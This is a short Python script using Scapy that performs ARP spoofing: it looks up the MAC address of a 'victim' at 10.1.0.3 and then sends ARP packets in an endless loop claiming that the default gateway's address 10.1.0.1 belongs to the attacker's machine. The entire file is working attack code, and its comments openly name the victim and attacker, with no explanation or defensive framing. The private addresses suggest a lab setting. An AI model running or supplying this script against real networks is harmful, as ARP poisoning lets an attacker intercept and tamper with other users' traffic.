from scapy.all import *

target_ip   = '10.1.0.3'
defgw_ip    = '10.1.0.1'

# Automatically get the MAC address of the victim
def get_mac(ip):
    ans, _ = sr(ARP(op=ARP.who_has, pdst=ip), timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv[ARP].hwsrc
    return None

target_mac = get_mac(target_ip)
if target_mac is None:
    print(f"Could not find MAC address for {target_ip}.")
    exit()

print(f"Found target MAC: {target_mac}")
#Send ARP packet saying that the MAC Address correspondent of the default gateway is the attacker's
ether   = Ether(dst=target_mac)
arp     = ARP(
        op='who-has',
        psrc=defgw_ip,
        pdst=target_ip,
)

sendp(ether/arp, inter=0.2, loop=1)
